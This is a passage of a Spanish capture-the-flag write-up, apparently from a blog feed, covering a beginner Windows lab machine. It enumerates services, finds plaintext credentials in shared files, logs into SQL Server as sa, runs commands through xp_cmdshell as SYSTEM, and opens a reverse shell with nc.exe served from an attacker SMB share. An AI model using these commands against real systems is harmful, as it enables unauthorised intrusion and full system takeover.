-|   10.0.2.145<span class="se">\C</span>OMPAC: 
-|     Target_Name: DESKTOP-M464J3M
-|     NetBIOS_Domain_Name: DESKTOP-M464J3M
-|     NetBIOS_Computer_Name: DESKTOP-M464J3M
-|     DNS_Domain_Name: DESKTOP-M464J3M
-|     DNS_Computer_Name: DESKTOP-M464J3M
-|_    Product_Version: 10.0.19041
-MAC Address: 08:00:27:B0:1C:C9 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
-Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| nbstat: NetBIOS name: DESKTOP-M464J3M, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:b0:1c:c9 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
-| Names:
-|   DESKTOP-M464J3M&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
-|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
-|   DESKTOP-M464J3M&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
-|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
-|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
-|_  <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   <span class="nb">date</span>: 2024-06-30T17:29:55
-|_  start_date: N/A
-|_clock-skew: mean: 26s, deviation: 0s, median: 25s
-</code></pre></div></div>
-
-<p>Encontramos una web en el puerto <code class="language-plaintext highlighter-rouge">9081</code>, vemos que tecnología usa con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">-a</span> 3 http://10.0.2.145:9081
-http://10.0.2.145:9081 <span class="o">[</span>302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Cassini/4.0.1.6], IP[10.0.2.145], RedirectLocation[/App/Login.aspx], Title[Object moved]                                                                                                                                                         
-http://10.0.2.145:9081/App/Login.aspx <span class="o">[</span>200 OK] ASP_NET[4.0.30319], Bootstrap, Cookies[ASP.NET_SessionId], Country[RESERVED][ZZ], HTML5, HTTPServer[Cassini/4.0.1.6], HttpOnly[ASP.NET_SessionId], IP[10.0.2.145], JQuery[3.7.0], PasswordField[txtPassword], Script[text/javascript], Title[Login Saci]
-</code></pre></div></div>
-
-<p>Realizamos una búsqueda de ficheros y directorios con <code class="language-plaintext highlighter-rouge">feroxbuster</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://10.0.2.145:9081 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> aspx <span class="nt">-r</span> <span class="nt">-d</span> 2
-...
-200      GET        2l        2w       22c http://10.0.2.145:9081/download/notas.txt
-...
-
-</code></pre></div></div>
-
-<p>Encontramos un fichero llamado <code class="language-plaintext highlighter-rouge">notas.txt</code>, lo descargamos y leemos lo que tiene:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.0.2.145:9081/download/notas.txt
-supervisor
-supervisor
-</code></pre></div></div>
-
-<p>Parece que son las credenciales para acceder a la web. Nos logeamos con éxito pero no conseguimos hacer nada para ganar la intrusión. Asi que miramos a ver que hay en el servicio <code class="language-plaintext highlighter-rouge">samba</code>. Ejecutamos <code class="language-plaintext highlighter-rouge">smbclient</code> con los parámetros <code class="language-plaintext highlighter-rouge">—-no-pass</code> para no usar credenciales, <code class="language-plaintext highlighter-rouge">-L</code> para hacer un listado de unidades y el target <code class="language-plaintext highlighter-rouge">//10.0.2.145</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">--no-pass</span> <span class="nt">-L</span> //10.0.2.145
-
-        Sharename       Type      Comment
-        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
-        ADMIN<span class="nv">$ </span>         Disk      Admin remota
-        C<span class="nv">$ </span>             Disk      Recurso predeterminado
-        Compac          Disk      
-        IPC<span class="nv">$ </span>           IPC       IPC remota
-        Users           Disk
-</code></pre></div></div>
-
-<p>Vemos 2 recursos compartidos interesantes <code class="language-plaintext highlighter-rouge">Compac</code> y <code class="language-plaintext highlighter-rouge">Users</code>. Nos conectamos al recurso <code class="language-plaintext highlighter-rouge">Compac</code> y listamos los directorios:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">--no-pass</span> //10.0.2.145/Compac
-Try <span class="s2">"help"</span> to get a list of possible commands.
-smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
-  <span class="nb">.</span>                                   D        0  Sat May 11 04:49:15 2024
-  ..                                  D        0  Sat May 11 04:49:15 2024
-  Empresas                            D        0  Sat May 11 04:49:15 2024
-  Index                               D        0  Sun Jun 30 23:52:48 2024
-</code></pre></div></div>
-
-<p>Haciendo un listado de <code class="language-plaintext highlighter-rouge">Empresas</code> vemos un fichero que llama la atención <code class="language-plaintext highlighter-rouge">SQL.txt</code>, lo descargamos a nuestra máquina:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\E</span>mpresas<span class="se">\&gt;</span> get SQL.txt 
-getting file <span class="se">\E</span>mpresas<span class="se">\S</span>QL.txt of size 448 as SQL.txt <span class="o">(</span>5.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 5.3 KiloBytes/sec<span class="o">)</span>
-</code></pre></div></div>
-
-<p>Lo abrimos y vemos unas posibles credenciales de acceso al servicio de <code class="language-plaintext highlighter-rouge">SQL Server</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>SQL.txt 
-SQL 2017 
-Instancia COMPAC 
-sa 
-Contpaqi2023.
-
-</code></pre></div></div>
-
-<h1 id="intrusión">Intrusión</h1>
-
-<p>Vamos a usar el cliente de sql que trae el paquete <code class="language-plaintext highlighter-rouge">impacket</code>. Usamos <code class="language-plaintext highlighter-rouge">impacket-mssqlclient</code> con los parámetros <code class="language-plaintext highlighter-rouge">COMPAC/</code> , que es el nombre de dominio que hemos visto en el escaneo, seguido de las credenciales <code class="language-plaintext highlighter-rouge">sa:Contpaqi2023.</code> , le indicamos el target <code class="language-plaintext highlighter-rouge">@10.0.2.145</code> y el puerto, ya que no está en el puerto por defecto, <code class="language-plaintext highlighter-rouge">-port 49992</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-mssqlclient COMPAC/sa:Contpaqi2023.@10.0.2.145 <span class="nt">-port</span> 49992
-Impacket v0.12.0.dev1 - Copyright 2023 Fortra
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DESKTOP-M464J3M<span class="se">\C</span>OMPAC<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DESKTOP-M464J3M<span class="se">\C</span>OMPAC<span class="o">)</span>: Line 1: Changed language setting to us_english.
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span> 
-<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
-SQL <span class="o">(</span>sa  dbo@master<span class="o">)&gt;</span>
-</code></pre></div></div>
-
-<p>En SQL Server hay un comando que sirve para ejecutar comandos por una shell, <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>. Asi que una vez conectados probamos a ver si funciona el comando:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>sa  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="nb">whoami
-</span>output                
-<span class="nt">-------------------</span>   
-nt authority<span class="se">\s</span>ystem   
-
-NULL
-</code></pre></div></div>
-
-<p>Vemos que si y encima está ejecutando los comandos como <strong>nt authority\system.</strong></p>
-
-<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
-
-<p>Vamos a preparar la obtención de una shell remota como <strong>nt authority\system</strong>. Para ello nos copiamos el binario <code class="language-plaintext highlighter-rouge">nc.exe</code> a nuestro directorio de trabajo. También ponemos el servidor samba con <code class="language-plaintext highlighter-rouge">impacket-smbserver</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> /usr/share/windows-binaries/nc.exe <span class="nb">.</span>
-
-<span class="nv">$ </span>impacket-smbserver <span class="nt">-smb2support</span> murrusko <span class="nb">.</span>
-Impacket v0.12.0.dev1 - Copyright 2023 Fortra
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-</code></pre></div></div>
-
-<p>Nos ponemos a la escucha en nuestra máquina:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
-listening on <span class="o">[</span>any] 8888 ...
-</code></pre></div></div>
-
-<p>Y ejecutamos el comando para obtener la shell reversa:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>sa  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="se">\\</span>10.0.2.5<span class="se">\m</span>urrusko<span class="se">\n</span>c.exe 10.0.2.5 8888 <span class="nt">-e</span> cmd
-</code></pre></div></div>
-
-<p>Conseguimos la shell y vemos que realmente estamos con <strong>nt authority\system</strong>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
-listening on <span class="o">[</span>any] 8888 ...
-connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.145] 49246
-Microsoft Windows <span class="o">[</span>Versi?n 10.0.19045.2965]
-<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. Todos los derechos reservados.
-
-C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami  
-<span class="nb">whoami
-</span>nt authority<span class="se">\s</span>ystem
-
-C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
-</code></pre></div></div>
-
-<p>Ahora solo queda obtener las flags, pero antes solo queda un reto, obtener la flag de root… Os lo dejo a vosotros, como pista buscar <strong>ADS data streams</strong></p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="windows" /><category term="principiante" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="windows" /><category term="principiante" /><summary type="html"><![CDATA[Estamos ante una máquina Windows de nivel principiante creada por CuriosidadesDeHackers y condor de la plataforma The Hackers Labs.]]></summary></entry></feed>
